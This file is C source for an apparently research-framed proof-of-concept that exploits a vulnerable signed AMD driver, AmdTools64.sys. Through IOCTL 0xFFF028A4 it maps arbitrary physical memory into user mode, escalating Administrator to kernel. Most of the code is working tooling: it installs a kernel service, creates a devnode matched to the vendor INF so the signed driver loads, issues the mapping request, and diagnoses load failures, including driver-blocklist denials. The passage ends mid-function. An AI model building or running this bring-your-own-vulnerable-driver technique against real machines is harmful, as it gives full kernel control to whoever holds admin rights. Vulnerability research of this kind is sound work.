/*
 * amd_map_poc.c -- PoC for AmdTools64.sys, IOCTL 0xFFF028A4
 *                  arbitrary physical-memory map into user mode
 *
 *                     mistrust development -- research build
 *
 * Verified against AmdTools64.sys md5 f3063aeff8b4ca56c6d870302ae80a0d
 * (AMD driver, base 0x140000000, 2026-10-13 session in IDA).
 *
 * VULNERABLE CODE PATH
 *   DriverEntry -> sub_140014000 (MajorFunction table) -> sub_1400055EC
 *   -> IRP_MJ_DEVICE_CONTROL entry (dispatch table @0x14000B280 +14) = sub_1400051A0
 *   -> sub_1400058D8 (case 0xFFF028A4, requires [+0x10] >= 0x21 && [+8] >= 0x21)
 *   -> sub_140002090:
 *        PhysicalAddress = *(UINT64*)(SysBuf+0x00)   ; fully attacker controlled
 *        NumberOfBytes   = *(UINT32*)(SysBuf+0x08)   ; fully attacker controlled
 *        MmMapIoSpace(PhysicalAddress, NumberOfBytes, CacheType)   ; no validation at all
 *        IoAllocateMdl -> MmBuildMdlForNonPagedPool
 *        MmMapLockedPagesSpecifyCache(Mdl, AccessMode=UserMode, BugCheckOnFailure=0)
 *        reply: [SysBuf+0x18] = user-mode VA of the mapped physical memory
 *
 * TRANSPORT (reversed from sub_1400051A0/sub_1400058D8 raw asm; CORRECTED):
 *   The command is dwIoControlCode itself. On x64 the DeviceIoControl
 *   parameters are POINTER_ALIGNMENT-padded (WRK base/ntos/inc/io.h), so the
 *   stack-location reads in sub_1400051A0 decode as:
 *     - input  len <- [+0x10] InputBufferLength      gate: >= 0x21 for most cmds
 *     - output len <- [+0x08] OutputBufferLength     gate: >= 0x21 (33) for map/unmap
 *     - command    <- [+0x18] IoControlCode          (0xFFF028xx codes @0x1400058D8)
 *     - Type3InputBuffer ([+0x20]) is NEVER read.
 *   All map/unmap codes end with (code & 3) == 0 -> METHOD_BUFFERED:
 *   SystemBuffer = kernel copy of lpInBuffer (0x30 bytes; alloc = max(in,out)),
 *   and the driver's reply fields (status@+0x0C, block@+0x10, userVa@+0x18 --
 *   written into SystemBuffer by sub_140002090/sub_140002CB8) are copied back
 *   to lpOutBuffer on completion using IoStatus.Information, which
 *   sub_1400051A0 sets to OutputBufferLength (0x21 = 33 bytes).
 *     DeviceIoControl(hDev, 0xFFF028A4, &req, 0x30, &reply, 0x21, &br, NULL)
 *   NOTE: an earlier draft used dwIoControlCode = 0x24 with the command in
 *   lpInBuffer; the driver then decoded command 0x24 -> unknown -> 0xC00000BB
 *   -> ERROR_NOT_SUPPORTED (GLE 50). No special address reservation needed.
 *
 * IMPACT (admin -> kernel):
 *   Any Administrator/SYSTEM-openable process receives a writeable user-mode
 *   mapping of an arbitrary physical address -- read/write of physical memory
 *   from user space, e.g. kernel pages => complete kernel compromise.
 *
 * SAFETY: default mode is READ-ONLY (maps user-chosen physical address and
 *   dumps it). Writing is gated behind --write-pa and the touched 8 bytes are
 *   restored after readback. Wrong physical addresses can still crash the OS.
 *   The device ACL limits this to Administrators/SYSTEM (see sub_140005380).
 *
 * INSTALL / LOAD (v1.2 -- fixes the v1.1 field failure):
 *   v1.1's load_amd_servicemode.cmd wrote HKLM\...Enum\Root\AMDTOOLSAUDIT\0000
 *   with reg.exe and rescanned; on real hardware PnP never reported the
 *   hand-made key as PRESENT -> phantom devnode -> driver never loaded ->
 *   zero device interfaces ("CM list was a phantom entry" in the logs). The
 *   reliable route is the one the reference PoC (poc_amdtools64.cpp) proved:
 *   CreateServiceW -> CM_Create_DevNodeW -> CM_Add_IDW -> CM_DRP_SERVICE bind
 *   -> best-effort UpdateDriverForPlugAndPlayDevicesW(INSTALLFLAG_FORCE) ->
 *   CM_Setup_DevNode(READY) -> poll for the interface to go live.
 *
 * Build (Linux cross):  x86_64-w64-mingw32-gcc -O2 -std=c11 -municode -o amd_map_poc.exe amd_map_poc.c -lcfgmgr32 -lsetupapi -lnewdev -ladvapi32
 * Run (Windows, elevated): amd_map_poc.exe [--install] [--pa N] [--len N]
 *                          [--cache 0|1|2] [--write-pa N --value V] [--no-unmap]
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdarg.h>
#include <stddef.h>
#include <setupapi.h>
#include <cfgmgr32.h>
/* CM_Get_Root_DevNode: exported by cfgmgr32.dll, but neither declared in the
 * mingw header nor present in libcfgmgr32.a -- resolve it at runtime. */
static CONFIGRET (WINAPI *get_root_devnode)(DEVINST *, ULONG);
#include <newdev.h>
#include <inttypes.h>

#define DEVICE_IFACE_GUID \
    { 0x1232175B, 0x1C34, 0x41FD, { 0xB1, 0x01, 0x34, 0x2D, 0x47, 0xB8, 0x28, 0xAC } }

/* Command codes: dwIoControlCode IS the command (selector in sub_1400058D8) */
#define CMD_MAP      0xFFF028A4   /* arbitrary physical map  (sub_140002090) */
#define CMD_UNMAP    0xFFF028A8   /* unmap + MDL/pool free   (sub_140002CB8) */
#define REQ_LEN      0x30         /* InputBufferLength  gate >= 0x21 */
#define TRANS_OUT_LEN 0x21        /* OutputBufferLength gate; copy-back size */

#define TOOL_TITLE        L"amd_map_poc"
#define TOOL_VERSION      L"v1.4"
#define TOOL_BRAND        L"mistrust development"
#define TOOL_CON_TITLE    L"mistrust dev :: amd_map_poc"

/* audit install identity: kernel service + root devnode created by --install.
 * The devnode's hardware ID must match the genuine WHQL-signed INF
 * (amdtools.inf, DriverVer 1.7.16.218: %AmdTools_Desc%=AmdTools64_Inst,
 * *AMDTOOLSDEV) so the driver store can bind its package to this node:
 * AddService then creates and ASSOCIATES the AmdTools64 service, writes the
 * class/desc and the device SDDL, and AddDevice runs. The instance ID stays
 * audit-named; only the matchable identity changed. */
static const WCHAR AUDIT_SVC[]  = L"AMDTOOLS64";
static const WCHAR AUDIT_NODE[] = L"Root\\AMDTOOLSAUDIT\\0000";
static const WCHAR AUDIT_HWID[] = L"*AMDTOOLSDEV";

/* 0x30-byte request/reply copied into the METHOD_BUFFERED SystemBuffer.
 * Layout verified in sub_140002090 (map) and sub_140002CB8 (unmap). */
#pragma pack(push, 1)
typedef struct _DEVREQ {
    UINT64 mapPa;    /* +0x00 map: physical address (fully attacker controlled) */
    UINT32 mapLen;   /* +0x08 map: byte count                                   */
    UINT32 status;   /* +0x0C reply: 0 ok / 5 resources / 6 invalid length      */
    UINT64 block;    /* +0x10 reply map / input unmap: kernel pool handle       */
    UINT64 userVa;   /* +0x18 reply: user-mode VA of the mapping                */
    UINT8  cache;    /* +0x20 map: 0 noncached, 1 cached, 2 write-combined      */
    UINT8  tail[0x0F]; /* pad out to 0x30 */
} DEVREQ;
#pragma pack(pop)
C_ASSERT(sizeof(DEVREQ) == 0x30);
#define TRANS_IN_LEN  (DWORD)sizeof(DEVREQ)

static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ---- teelogging: every message goes to the console AND to a .log file ---- */
static FILE *g_log;

static void Emit(const wchar_t *line)
{
    size_t n = line ? wcslen(line) : 0;

    /* console and log file always get byte-identical content */
    fputws(line ? line : L"", stdout);
    if (n && line[n - 1] != L'\n')
        fputws(L"\n", stdout);
    if (g_log) {
        fputws(line ? line : L"", g_log);
        if (n && line[n - 1] != L'\n')
            fputws(L"\n", g_log);
        fflush(g_log);
    }
}

static void LogW(const wchar_t *fmt, ...)
{
    wchar_t buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vswprintf(buf, 1023, fmt, ap);
    va_end(ap);
    buf[1023] = 0;
    Emit(buf);
}

static void LogA(const char *fmt, ...)
{
    char a[768];
    wchar_t w[1024];
    size_t i, n = 0;
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(a, sizeof(a), fmt, ap);
    va_end(ap);
    a[sizeof(a) - 1] = 0;
    for (i = 0; a[i] && n < 1023; i++)
        w[n++] = (wchar_t)(unsigned char)a[i];
    w[n] = 0;
    Emit(w);
}

static void OpenTeelog(void)
{
    wchar_t path[640], *slash;
    SYSTEMTIME st;

    if (!GetModuleFileNameW(NULL, path, 512)) {
        fputws(L"[!] cannot resolve exe path for teelogging -- console only\n", stdout);
        return;
    }
    path[639] = 0;
    slash = wcsrchr(path, L'\\');
    if (!slash) {
        fputws(L"[!] exe path has no directory part -- teelogging disabled\n", stdout);
        return;
    }
    if ((size_t)(slash - path) + sizeof(L"\\amd_map_poc.log") / sizeof(WCHAR) >= 640) {
        fputws(L"[!] exe path too long for teelogging -- console only\n", stdout);
        return;
    }
    wcscpy(slash + 1, L"amd_map_poc.log");
    /* append across runs; first open fixes the encoding to UTF-8 */
    g_log = _wfopen(path, L"a, ccs=UTF-8");
    if (!g_log) {
        fputws(L"[!] could not open amd_map_poc.log next to the exe (dir read-only?) -- console only\n", stdout);
        return;
    }
    GetLocalTime(&st);
    LogW(L"---- log opened %04u-%02u-%02u %02u:%02u:%02u", st.wYear, st.wMonth, st.wDay,
         st.wHour, st.wMinute, st.wSecond);
    LogW(L"    cmdline . %ls", GetCommandLineW());
    LogW(L"    teelog .. %ls", path);
}

static void DiagnoseInterface(const WCHAR *iface);

static const wchar_t DASHES[] =
    L"--------------------------------------------------------------";

static void PrintBanner(void)
{
    LogW(L"");
    LogW(L"  +==========================================================+");
    LogW(L"    %ls  //  %ls  %ls", TOOL_BRAND, TOOL_TITLE, TOOL_VERSION);
    LogW(L"    AmdTools64.sys 0xFFF028A4 -- arbitrary physical memory map PoC");
    LogW(L"  +==========================================================+");
}

/* visual section header: "  ---- title -------------" padded to a fixed width */
static void Section(const wchar_t *title)
{
    size_t n = title ? wcslen(title) : 0;
    int pad;

    LogW(L"");
    if (n < 44) {
        pad = (int)(44 - n);
        LogW(L"  ---- %ls %.*ls", title, pad, DASHES);
    } else {
        LogW(L"  ---- %ls", title);
    }
}

/*
 * Authoritative fallback: SetupAPI enumeration. Answers "does ANY device that
 * is present right now expose interface {GUID}?" with descriptions and status.
 */
static BOOL EnumerateInterfaceDevices(HANDLE *hOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    HDEVINFO h;
    DWORD i;

    h = SetupDiGetClassDevsW(&g, NULL, NULL, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
    if (h == INVALID_HANDLE_VALUE) {
        LogW(L"[!] SetupDiGetClassDevs failed GLE=%lu", GetLastError());
        return FALSE;
    }

    for (i = 0;; i++) {
        SP_DEVICE_INTERFACE_DATA ifd;
        SP_DEVINFO_DATA did;
        BYTE buf[1600];
        SP_DEVICE_INTERFACE_DETAIL_DATA_W *det = (SP_DEVICE_INTERFACE_DETAIL_DATA_W *)buf;
        ULONG st = 0, pr = 0;
        WCHAR desc[256];

        ZeroMemory(&ifd, sizeof(ifd));
        ifd.cbSize = sizeof(ifd);
        if (!SetupDiEnumDeviceInterfaces(h, NULL, &g, i, &ifd)) {
            if (GetLastError() == ERROR_NO_MORE_ITEMS) {
                if (i == 0)
                    LogW(L"[x] SetupAPI: ZERO present devices expose interface "
                         L"{1232175B-1C34-41FD-B101-342D47B828AC} -- no live "
                         L"interface at all (devnode absent/phantom, or its "
                         L"driver never loaded)");
                break;
            }
            LogW(L"[!] SetupDiEnumDeviceInterfaces failed GLE=%lu", GetLastError());
            break;
        }

        det->cbSize = offsetof(SP_DEVICE_INTERFACE_DETAIL_DATA_W, DevicePath);
        ZeroMemory(&did, sizeof(did));
        did.cbSize = sizeof(did);
        if (!SetupDiGetDeviceInterfaceDetailW(h, &ifd, det, sizeof(buf), NULL, &did)) {
            LogW(L"[!] SetupDiGetDeviceInterfaceDetail failed GLE=%lu", GetLastError());
            continue;
        }

        LogW(L"[+] SetupAPI interface[%lu]: %ls", (unsigned long)i, det->DevicePath);
        if (SetupDiGetDeviceRegistryPropertyW(h, &did, SPDRP_DEVICEDESC, NULL,
                                              (BYTE *)desc, sizeof(desc), NULL))
            LogW(L"      device: %ls", desc);
        if (CM_Get_DevNode_Status(&st, &pr, did.DevInst, 0) == CR_SUCCESS)
            LogW(L"      devnode status=0x%08lX problem=%lu %ls%ls", st, pr,
                 (st & DN_STARTED) ? L"STARTED" : L"NOT_STARTED",
                 (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");

        *hOut = CreateFileW(det->DevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (*hOut != INVALID_HANDLE_VALUE)
            return TRUE;
        LogW(L"[!] CreateFileW on it failed GLE=%lu", GetLastError());
    }

    SetupDiDestroyDeviceInfoList(h);
    return FALSE;
}

/*
 * CM returns a REG_MULTI_SZ of registered interface paths (PRESENT = devices
 * currently in the tree). Entries can be EMPTY strings for phantom/stale
 * registrations, so walk all entries, skip empties, try each.
 */
static BOOL OpenDeviceByInterface(HANDLE *hOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    WCHAR list[2048];
    ULONG len = (ULONG)(sizeof(list) / sizeof(list[0]));
    unsigned idx = 0;
    const WCHAR *s;
    CONFIGRET cr;

    cr = CM_Get_Device_Interface_ListW(&g, NULL, list,
                                       len, CM_GET_DEVICE_INTERFACE_LIST_PRESENT);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] no device interface {1232175B-1C34-41FD-B101-342D47B828AC} present "
             L"(driver loaded? AMD hardware attached?) (CR=0x%08X)", cr);
        return FALSE;
    }

    for (s = list; *s; idx++) {
        LogW(L"[+] interface[%u]: %ls", idx, s);
        *hOut = CreateFileW(s, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (*hOut != INVALID_HANDLE_VALUE)
            return TRUE;
        {
            DWORD gle = GetLastError();
            LogW(L"[!] CreateFileW failed GLE=%lu%s", gle,
                 gle == 3 ? L" (ERROR_PATH_NOT_FOUND: interface registered but symbolic link not live -> device not started)"
                          : (gle == 5 ? L" (ACCESS_DENIED -- need Administrator/SYSTEM)" : L""));
            if (gle == 3)
                DiagnoseInterface(s);
        }
        s += wcslen(s) + 1;
    }

    LogW(L"[i] CM PRESENT interface list has no live path: the devnode is\n"
         L"    absent, phantom, or not started. This is the exact signature of\n"
         L"    the v1.1 raw-registry install (PnP never reports a hand-written\n"
         L"    Enum\\Root key as PRESENT). Re-run with --install to create the\n"
         L"    devnode through the CM APIs.");
    return EnumerateInterfaceDevices(hOut);
}

#ifndef DN_STARTED
#define DN_STARTED      0x00000008
#endif
#ifndef DN_HAS_PROBLEM
#define DN_HAS_PROBLEM  0x00000400
#endif
#ifndef CM_DRP_DRIVER
#define CM_DRP_DRIVER   0x00000009
#endif

/* Device Manager "Code N" == decimal CM problem code */
static const struct { ULONG c; const WCHAR *n; } g_problemCodes[] = {
    { 1,  L"Code 1: device not configured correctly (misconfigured)" },
    { 10, L"Code 10: device cannot start" },
    { 22, L"Code 22: device disabled (Device Manager)" },
    { 24, L"Code 24: device not working / not started" },
    { 28, L"Code 28: drivers not installed for this device" },
    { 31, L"Code 31: device not working, cause unknown" },
    { 39, L"Code 39: driver failed to load (corrupt/missing/blocked)" },
    { 45, L"Code 45: device not connected / phantom devnode" },
    { 52, L"Code 52: driver blocked from loading -- signature / code integrity"
           L" (a Microsoft vulnerable-driver-blocklist denial of a properly"
           L" signed driver shows up here on HVCI systems)" },
};

/*
 * GLE=3 (ERROR_PATH_NOT_FOUND) on a device-interface path means the interface
 * is registered in the registry but its symbolic link is not live: the owning
 * devnode is present but not started (the driver enables the interface only
 * after IRP_MN_START_DEVICE succeeds -- sub_140004390 @0x1400044cf).
 * CM still lists interfaces of devices that are merely present, so decode the
 * devnode instance out of the path and report its status/problem/bound driver.
 */
static void DiagnoseInterface(const WCHAR *iface)
{
    WCHAR id[512], drv[200];
    const WCHAR *p, *q;
    ULONG n = 0;
    DEVINST dn;
    ULONG st = 0, pr = 0;
    ULONG sz = sizeof(drv);
    CONFIGRET cr;
    unsigned i;

    if (!iface || !*iface) {   /* empty path: CM_Locate_DevNode would "succeed" on the root devnode */
        LogW(L"[!] interface path is EMPTY (phantom/stale registration -- device no longer present)");
        return;
    }

    p = iface;
    if (!_wcsnicmp(p, L"\\\\?\\", 4))
        p += 4;
    for (q = p; *q && *q != L'{' && n < 508; q++)
        id[n++] = (*q == L'#') ? L'\\' : *q;
    id[n] = 0;

    if (CM_Locate_DevNodeW(&dn, id, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS) {
        LogW(L"[!] devnode '%ls' is not in the device tree "
                         L"(hardware that binds this interface is NOT present on this machine)\n", id);
        return;
    }
    LogW(L"[i] devnode: %ls\n", id);

    cr = CM_Get_DevNode_Status(&st, &pr, dn, 0);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Get_DevNode_Status CR=0x%X\n", cr);
        return;
    }
    LogW(L"[i] status=0x%08lX problem=0x%08lX (%lu)%ls%ls\n",
             (unsigned long)st, (unsigned long)pr, (unsigned long)pr,
             (st & DN_STARTED) ? L" STARTED" : L" NOT_STARTED",
             (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");
    if (st & DN_HAS_PROBLEM)
        for (i = 0; i < sizeof(g_problemCodes) / sizeof(g_problemCodes[0]); i++)
            if (g_problemCodes[i].c == pr) {
                LogW(L"[i] meaning: %ls\n", g_problemCodes[i].n);
                break;
            }

    if (CM_Get_DevNode_Registry_PropertyW(dn, CM_DRP_DRIVER, NULL, drv, &sz, 0) == CR_SUCCESS)
        LogW(L"[i] bound driver service: %ls\n", drv);
    else
        LogW(L"[i] no driver service bound to this devnode (INF not installed/matched)\n");
}

/* ---- install: the working load path (v1.2) ------------------------------- */

/* AmdTools64.sys is expected next to this exe */
static BOOL PathOfDriver(WCHAR *out, size_t cch)
{
    WCHAR path[640], *slash;

    if (!GetModuleFileNameW(NULL, path, 512))
        return FALSE;
    slash = wcsrchr(path, L'\\');
    if (!slash)
        return FALSE;
    slash[1] = 0;
    if (wcslen(path) + 16 >= cch)
        return FALSE;
    wcscpy(out, path);
    wcscat(out, L"AmdTools64.sys");
    return TRUE;
}

/* step 1: kernel service whose ImagePath is our AmdTools64.sys */
static BOOL EnsureService(const WCHAR *sysPath)
{
    SC_HANDLE scm, svc;

    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        LogW(L"[!] OpenSCManagerW failed GLE=%lu (run elevated)\n", GetLastError());
        return FALSE;
    }
    svc = CreateServiceW(scm, AUDIT_SVC, AUDIT_SVC, SERVICE_ALL_ACCESS,
                         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                         SERVICE_ERROR_NORMAL, sysPath,
                         NULL, NULL, NULL, NULL, NULL);
    if (svc) {
        LogW(L"[+] kernel service %ls created (binPath=%ls)\n", AUDIT_SVC, sysPath);
    } else if (GetLastError() == ERROR_SERVICE_EXISTS) {
        LogW(L"[=] kernel service %ls already exists, reusing\n", AUDIT_SVC);
        svc = OpenServiceW(scm, AUDIT_SVC, SERVICE_ALL_ACCESS);
    } else {
        LogW(L"[!] CreateServiceW failed GLE=%lu\n", GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }
    if (!svc) {
        LogW(L"[!] OpenServiceW(%ls) failed GLE=%lu\n", AUDIT_SVC, GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

/* minimal function-driver INF next to the .sys, devcon-style. Catalog-less,
 * so driver-store staging may reject it -- fine: the CM_DRP_SERVICE bind is
 * what actually loads the driver; the INF just lets PnP fill Class/Driver. */
static BOOL WriteInf(const WCHAR *infPath, const WCHAR *sysPath)
{
    char inf[2048], sysA[1040];
    int n;
    HANDLE f;
    DWORD written = 0;
    BOOL ok;

    if (!WideCharToMultiByte(CP_ACP, 0, sysPath, -1, sysA, sizeof(sysA), NULL, NULL))
        return FALSE;
    n = snprintf(inf, sizeof(inf),
        "[Version]\r\n"
        "Signature=\"$WINDOWS NT$\"\r\n"
        "Class=System\r\n"
        "ClassGuid={4D36E97D-E325-11CE-BFC1-08002BE10318}\r\n"
        "Provider=%%AMD%%\r\n"
        "DriverVer=10/15/2026,1.0.0.1\r\n"
        "\r\n"
        "[Manufacturer]\r\n"
        "%%AMD%%=AMD,NTamd64\r\n"
        "\r\n"
        "[AMD.NTamd64]\r\n"
        "%%DevDesc%%=AmdToolsAudit.Install,Root\\AMDTOOLSAUDIT\r\n"
        "\r\n"
        "[AmdToolsAudit.Install]\r\n"
        "\r\n"
        "[AmdToolsAudit.Install.Services]\r\n"
        "AddService=AMDTOOLS64,0x00000002,AmdToolsAudit.Service\r\n"
        "\r\n"
        "[AmdToolsAudit.Service]\r\n"
        "ServiceType=1\r\n"
        "StartType=3\r\n"
        "ErrorControl=1\r\n"
        "ServiceBinary=%s\r\n"
        "\r\n"
        "[Strings]\r\n"
        "AMD=\"AMD\"\r\n"
        "DevDesc=\"AmdTools64 audit devnode\"\r\n",
        sysA);
    if (n <= 0 || (size_t)n >= sizeof(inf))
        return FALSE;
    f = CreateFileW(infPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        LogW(L"[!] CreateFileW(%ls) failed GLE=%lu\n", infPath, GetLastError());
        return FALSE;
    }
    ok = WriteFile(f, inf, (DWORD)n, &written, NULL) && written == (DWORD)n;
    CloseHandle(f);
    return ok;
}

/* steps 2-5: create the devnode, bind the service, start it. Self-heals over
 * the v1.1 reg.exe leftover (a phantom devnode under the same instance ID). */
/* fresh root devnodes only rise on an enumeration event (boot, DMR refresh,
 * CM_Reenumerate_DevNode); force a synchronous scan of the tree root.
 * CM_Get_Root_DevNode is missing from the mingw header and import lib --
 * resolve it at runtime (W then A), falling back to the root's well-known
 * device-instance id "HTREE\ROOT\0" via CM_Locate_DevNodeW.
 * returns 0 ok / -1 root unreachable / -2 reenumeration failed */
static int ForceRootRescan(void)
{
    DEVINST root = 0;

    if (!get_root_devnode) {
        HMODULE cm = GetModuleHandleW(L"cfgmgr32.dll");
        if (cm) {
            get_root_devnode = (void *)GetProcAddress(cm, "CM_Get_Root_DevNodeW");
            if (!get_root_devnode)
                get_root_devnode = (void *)GetProcAddress(cm, "CM_Get_Root_DevNodeA");
        }
    }
    if (!(get_root_devnode && get_root_devnode(&root, 0) == CR_SUCCESS) &&
        CM_Locate_DevNodeW(&root, (DEVINSTID_W)L"HTREE\\ROOT\\0", 0) != CR_SUCCESS)
        return -1;
    return CM_Reenumerate_DevNode(root, CM_REENUMERATE_SYNCHRONOUS) == CR_SUCCESS
        ? 0 : -2;
}

static BOOL InstallAndStart(void)
{
    WCHAR sysPath[640], infPath[640];
    DEVINST parent = 0, dev = 0;
    CONFIGRET cr;
    BOOL reboot = FALSE;

    if (!PathOfDriver(sysPath, sizeof(sysPath) / sizeof(sysPath[0]))) {
        LogW(L"[!] cannot resolve AmdTools64.sys next to this exe\n");
        return FALSE;
    }
    LogW(L"[*] driver image: %ls\n", sysPath);

    if (!EnsureService(sysPath))
        return FALSE;

    if (CM_Locate_DevNodeW(&parent, NULL, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS) {
        LogW(L"[!] CM_Locate_DevNodeW(root) failed\n");
        return FALSE;
    }

    cr = CM_Create_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, parent, CM_CREATE_DEVNODE_NORMAL);
    if (cr == CR_SUCCESS) {
        LogW(L"[+] devnode %ls created via CM_Create_DevNodeW\n", AUDIT_NODE);
    } else {
        /* leftover from a v1.1 raw-reg install is a PHANTOM: present in the
         * registry, never reported present. Wipe the stale key and retry. */
        cr = CM_Locate_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_PHANTOM);
        if (cr == CR_SUCCESS && RegDeleteTreeW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Enum\\Root\\AMDTOOLSAUDIT") == ERROR_SUCCESS) {
            LogW(L"[=] wiped stale v1.1 Enum\\Root\\AMDTOOLSAUDIT key (phantom devnode)\n");
            cr = CM_Create_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, parent, CM_CREATE_DEVNODE_NORMAL);
        }
        if (cr == CR_SUCCESS)
            LogW(L"[+] devnode %ls created via CM_Create_DevNodeW\n", AUDIT_NODE);
        else if (CM_Locate_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_NORMAL) == CR_SUCCESS)
            LogW(L"[=] devnode %ls already present, reusing\n", AUDIT_NODE);
        else {
            LogW(L"[!] cannot create/locate devnode %ls (CR=0x%X)\n", AUDIT_NODE, cr);
            return FALSE;
        }
    }

    if (CM_Add_IDW(dev, (DEVINSTID_W)AUDIT_HWID, CM_ADD_ID_HARDWARE) != CR_SUCCESS)
        LogW(L"[!] CM_Add_IDW failed (non-fatal)\n");

    cr = CM_Set_DevNode_Registry_PropertyW(dev, CM_DRP_SERVICE,
                                           (PVOID)AUDIT_SVC,
                                           sizeof(AUDIT_SVC), 0);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Set_DevNode_Registry_PropertyW(SERVICE) CR=0x%X\n", cr);
        return FALSE;
    }
    LogW(L"[+] devnode bound to service %ls\n", AUDIT_SVC);

    /* INF install: prefer the genuine WHQL-signed package (amdtools.inf +
     * AmdTools.cat beside the driver image) -- with its catalog present the
     * driver store accepts the stage and UDPD installs it onto the matched
     * devnode (*AMDTOOLSDEV), writing Service/class/desc/device-SDDL from the
     * vendor INF. Our generated catalog-less INF is only a fallback and will
     * be rejected by the store (0xE000022F). */
    {
        WCHAR genPath[640];
        WCHAR *slash;
        const WCHAR *useInf;
        wcscpy(genPath, sysPath);
        slash = wcsrchr(genPath, L'\\');
        if (slash)
            *++slash = 0;
        wcscat(genPath, L"amdtools.inf");
        useInf = genPath;
        if (GetFileAttributesW(genPath) == INVALID_FILE_ATTRIBUTES) {
            wcscpy(infPath, sysPath);
            wcscpy(infPath + wcslen(infPath) - 4, L".inf");
            if (!WriteInf(infPath, sysPath)) {
                LogW(L"[!] WriteInf FAILED (GLE=%lu) -- INF not written\n",
                     GetLastError());
                infPath[0] = 0;
                useInf = NULL;
            } else
                useInf = infPath;
            LogW(L"[=] genuine package INF not found -- generated fallback INF\n");
        }
        if (useInf) {
            LogW(L"[*] UDPD INF target: %ls (attrib=0x%08X)\n", useInf,
                 GetFileAttributesW(useInf));
            if (UpdateDriverForPlugAndPlayDevicesW(NULL, AUDIT_HWID, useInf,
                                                  INSTALLFLAG_FORCE, &reboot))
                LogW(L"[+] INF bound to devnode%s\n",
                     reboot ? L" (reboot required)" : L"");
            else
                LogW(L"[=] UpdateDriverForPlugAndPlayDevices rejected (GLE=%lu), "
                     L"continuing on the CM_DRP_SERVICE bind\n", GetLastError());
        }
    }

    cr = CM_Setup_DevNode(dev, CM_SETUP_DEVNODE_READY);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Setup_DevNode(READY) CR=0x%X -- devnode did not start\n", cr);
        return FALSE;
    }
    /* a freshly created root devnode only becomes PRESENT on an enumeration
     * event (boot, Device Manager refresh, CM_Reenumerate_DevNode) --
     * Setup_DevNode(READY) marks it startable, it does not enumerate it.
     * Without this the node sits unstarted with problem=0 and no DN bits
     * (the post-crash wedge on the mamo VM). Force a synchronous rescan. */
    int rr = ForceRootRescan();
    if (rr == 0)
        LogW(L"[+] CM_Setup_DevNode(READY) + synchronous root rescan: ok\n");
    else
        LogW(L"[!] Setup_DevNode(READY) ok, but the root rescan FAILED "
             L"(rc=%d) -- the devnode will not be enumerated; run "
             L"'pnputil /scan-devices' manually as fallback\n", rr);
    return TRUE;
}

/* quiet probe: is the interface live RIGHT NOW? (no logging on miss) */
static BOOL ProbeInterface(HANDLE *hOut, WCHAR *pathOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    WCHAR path[1024];

    if (CM_Get_Device_Interface_ListW(&g, NULL, path,
            (ULONG)(sizeof(path) / sizeof(path[0])),
            CM_GET_DEVICE_INTERFACE_LIST_PRESENT) != CR_SUCCESS)
        return FALSE;
    if (!*path)
        return FALSE;
    *hOut = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (*hOut == INVALID_HANDLE_VALUE)
        return FALSE;
    if (pathOut)
        wcscpy(pathOut, path);
    return TRUE;
}

/* interface enable can lag CM_Setup_DevNode by a moment: poll for it */
static BOOL OpenDeviceWait(HANDLE *hOut, DWORD totalMs)
{
    WCHAR path[1024];
    DWORD waited;

    for (waited = 0; waited < totalMs; waited += 250) {
        if (ProbeInterface(hOut, path)) {
            LogW(L"[+] device interface live: %ls\n", path);
            return TRUE;
        }
        Sleep(250);
    }
    return FALSE;
}

/*
 * Nothing opened: surface WHY. Distinguishes (a) install never ran (no
 * service / no devnode), (b) phantom devnode (the v1.1 raw-reg signature),
 * (c) devnode present with a problem code -- i.e. the driver image was
 * denied at load (signature/CI; a vulnerable-driver-blocklist denial of a
 * properly signed driver on an HVCI machine lands here), (d) everything
 * fine but the interface is not enabled yet.
 */
static void DiagnoseAuditDevnode(void)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS ss;
    DEVINST dn = 0;
    ULONG st = 0, pr = 0;
    CONFIGRET cr;
    unsigned i;

    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        LogW(L"[!] OpenSCManagerW failed GLE=%lu (run elevated)\n", GetLastError());
    } else {
        svc = OpenServiceW(scm, AUDIT_SVC, SERVICE_QUERY_STATUS);
        if (!svc) {
            LogW(L"[!] kernel service %ls does not exist -- install step was "
                 L"never run\n", AUDIT_SVC);
        } else {
            if (QueryServiceStatus(svc, &ss))
